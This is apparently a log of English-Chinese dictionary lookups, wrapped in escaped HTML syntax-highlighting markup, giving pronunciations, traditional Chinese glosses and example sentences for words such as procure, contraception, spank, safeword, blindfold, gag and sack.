    &lt;span class="n"&gt;He&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;deemed&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;traitor&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;his&lt;/span&gt; &lt;span class="n"&gt;own&lt;/span&gt; &lt;span class="n"&gt;people&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;他被人看作是叛徒。&lt;/span&gt;  
&lt;span class="n"&gt;vi&lt;/span&gt;&lt;span class="p"&gt;.[&lt;/span&gt;&lt;span class="n"&gt;W&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;持某種看法，作某種評價&lt;/span&gt;  


&lt;span class="n"&gt;procure&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pro&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;kj&lt;/span&gt;&lt;span class="err"&gt;ʊ&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pr&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;kju&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;vt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;（努力）取得，獲得；採辦；為……獲得&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;O1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="n"&gt;kind&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;original&lt;/span&gt; &lt;span class="n"&gt;painting&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;hard&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;procure&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;這種油畫的原作是不易弄到的。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;引起，導致&lt;/span&gt;  
    &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;traitors&lt;/span&gt; &lt;span class="n"&gt;procured&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;death&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;prince&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;賣國賊導致了王子之死。&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;介紹（娼妓），為……拉皮條&lt;/span&gt;  
  &lt;span class="mf"&gt;4.&lt;/span&gt; &lt;span class="err"&gt;實現，達成；完成&lt;/span&gt;  
    &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;two&lt;/span&gt; &lt;span class="n"&gt;parties&lt;/span&gt; &lt;span class="n"&gt;procured&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;temporary&lt;/span&gt; &lt;span class="n"&gt;agreement&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;雙方達成了臨時協議。&lt;/span&gt;  
&lt;span class="n"&gt;vi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;不及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;拉皮條&lt;/span&gt;  


&lt;span class="s"&gt;&amp;quot;oral contraception&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;  

&lt;span class="n"&gt;contraception&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;ntr&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ɛ&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="err"&gt;ʃə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ɔ&lt;/span&gt;&lt;span class="n"&gt;ntr&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;sep&lt;/span&gt;&lt;span class="err"&gt;ʃə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;避孕（法）&lt;/span&gt;  


&lt;span class="n"&gt;physician&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt;ɪˋ&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="err"&gt;ɪʃə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;fi&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;zi&lt;/span&gt;&lt;span class="err"&gt;ʃə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="err"&gt;可數名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;醫師&lt;/span&gt;  
    &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;physician&lt;/span&gt; &lt;span class="n"&gt;prescribed&lt;/span&gt; &lt;span class="n"&gt;him&lt;/span&gt; &lt;span class="n"&gt;some&lt;/span&gt; &lt;span class="n"&gt;medicine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;醫生給他開了一些藥。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;內科醫生&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;治療者&lt;/span&gt;  


&lt;span class="n"&gt;flog&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;fl&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;fl&lt;/span&gt;&lt;span class="err"&gt;ɔ&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;假部落格（&lt;/span&gt;&lt;span class="n"&gt;fake&lt;/span&gt; &lt;span class="n"&gt;weblog&lt;/span&gt;&lt;span class="err"&gt;之縮寫，看似個人部落格，實則是為行銷之用的網頁）&lt;/span&gt;  


&lt;span class="n"&gt;spank&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;æŋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;æŋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;vt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;（用手掌、拖鞋等）打……的屁股&lt;/span&gt;  
    &lt;span class="n"&gt;Mother&lt;/span&gt; &lt;span class="n"&gt;spanked&lt;/span&gt; &lt;span class="n"&gt;her&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;being&lt;/span&gt; &lt;span class="n"&gt;naughty&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;媽媽因為她調皮打她屁股。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;拍擊……使之前進&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;【美】【俚】（尤指在比賽中）擊敗&lt;/span&gt;  
&lt;span class="n"&gt;vi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;不及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;摑；啪地落下&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;【口】（車、船等）輕捷前進&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Q&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;along&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;We&lt;/span&gt; &lt;span class="n"&gt;spanked&lt;/span&gt; &lt;span class="n"&gt;along&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;his&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;car&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;我們坐在他的新車裡兜風。&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;一摑，一巴掌&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;gave&lt;/span&gt; &lt;span class="n"&gt;him&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;spank&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;being&lt;/span&gt; &lt;span class="n"&gt;so&lt;/span&gt; &lt;span class="n"&gt;rude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;他竟如此無禮，我打了他一巴掌。&lt;/span&gt;  


&lt;span class="s"&gt;&amp;quot;corporaiiy&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;  

&lt;span class="n"&gt;safe&lt;/span&gt;&lt;span class="err"&gt;·&lt;/span&gt;&lt;span class="n"&gt;word&lt;/span&gt;  
&lt;span class="n"&gt;IPA&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˈ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ā&lt;/span&gt;&lt;span class="n"&gt;fw&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;rd&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="n"&gt;serving&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;prearranged&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;unambiguous&lt;/span&gt; &lt;span class="n"&gt;signal&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;activity&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;such&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;between&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;domi&lt;/span&gt;  
&lt;span class="n"&gt;nant&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;submissive&lt;/span&gt; &lt;span class="n"&gt;sexual&lt;/span&gt; &lt;span class="n"&gt;couple&lt;/span&gt;  


&lt;span class="n"&gt;blindfold&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;bla&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;nd&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;fold&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;blaindf&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;uld&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;vt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;蒙住……的眼睛；蒙住（眼睛）&lt;/span&gt;  
    &lt;span class="n"&gt;They&lt;/span&gt; &lt;span class="n"&gt;blindfolded&lt;/span&gt; &lt;span class="n"&gt;my&lt;/span&gt; &lt;span class="n"&gt;eyes&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;week&lt;/span&gt; &lt;span class="n"&gt;after&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;operation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;手術後他們把我的眼睛蒙了一週時間。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;擋住……的視線&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;使不理解；使模糊不清&lt;/span&gt;  
    &lt;span class="n"&gt;Prejudice&lt;/span&gt; &lt;span class="n"&gt;blindfolds&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;mind&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;偏見使人無法正確理解事物。&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;形容詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;被蒙住眼睛的&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;魯莽的；輕率的&lt;/span&gt;  
    &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;blindfold&lt;/span&gt; &lt;span class="n"&gt;fury&lt;/span&gt;  
    &lt;span class="err"&gt;無名火&lt;/span&gt;  
&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;副詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;盲目地&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;魯莽地；輕率地&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="err"&gt;可數名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;遮眼布，眼罩&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;障眼物；蒙蔽人的事物&lt;/span&gt;  


&lt;span class="n"&gt;gag&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="err"&gt;可數名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;塞口物，口銜&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;言論箝制&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;【口】插科打諢，玩笑&lt;/span&gt;  
&lt;span class="n"&gt;vt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;塞住……的口&lt;/span&gt;  
    &lt;span class="n"&gt;She&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;gagged&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;blindfolded&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;她口被塞，眼被蒙。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;箝制……的言論&lt;/span&gt;  
&lt;span class="n"&gt;vi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;不及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;窒息，作嘔&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;on&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;She&lt;/span&gt; &lt;span class="n"&gt;gagged&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;piece&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;hard&lt;/span&gt; &lt;span class="n"&gt;bread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;她被一塊硬麵包噎住了。&lt;/span&gt;  


&lt;span class="n"&gt;burlap&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt;ɝ&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;粗麻布&lt;/span&gt;  


&lt;span class="n"&gt;sack&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="err"&gt;可數名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;袋；粗布袋；麻袋&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;一袋（的量）&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;He&lt;/span&gt; &lt;span class="n"&gt;bought&lt;/span&gt; &lt;span class="n"&gt;two&lt;/span&gt; &lt;span class="n"&gt;sacks&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;corn&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;他買了兩袋玉米。&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;【口】開除；解僱&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;S&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;He&lt;/span&gt; &lt;span class="n"&gt;got&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;sack&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;petty&lt;/span&gt; &lt;span class="n"&gt;thieving&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;他因微小竊盜遭到了解僱。&lt;/span&gt;  
  &lt;span class="mf"&gt;4.&lt;/span&gt; &lt;span class="err"&gt;【棒】壘&lt;/span&gt;  
  &lt;span class="mf"&gt;5.&lt;/span&gt; &lt;span class="err"&gt;【美】【俚】床；睡袋&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;S&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;bet&lt;/span&gt; &lt;span class="n"&gt;he&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="n"&gt;still&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;sack&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;我可以肯定他還在睡覺。&lt;/span&gt;  
&lt;span class="n"&gt;vt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;裝……入袋&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;【口】開除；解僱&lt;/span&gt;  
    &lt;span class="n"&gt;One&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;workmen&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;sacked&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;drunkenness&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;一個工人因酗酒被解僱。&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;（在競賽等中）勝過&lt;/span&gt;  
&lt;span class="n"&gt;vi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;不及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;【美】【俚】上床，睡覺&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="k"&gt;out&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;We&lt;/span&gt; &lt;span class="n"&gt;cleaned&lt;/span&gt; &lt;span class="n"&gt;up&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;sacked&lt;/span&gt; &lt;span class="k"&gt;out&lt;/span&gt; &lt;span class="n"&gt;early&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;我們收拾乾淨很早就上床睡了。&lt;/span&gt;  


&lt;span class="n"&gt;vaginal&lt;/span&gt;  
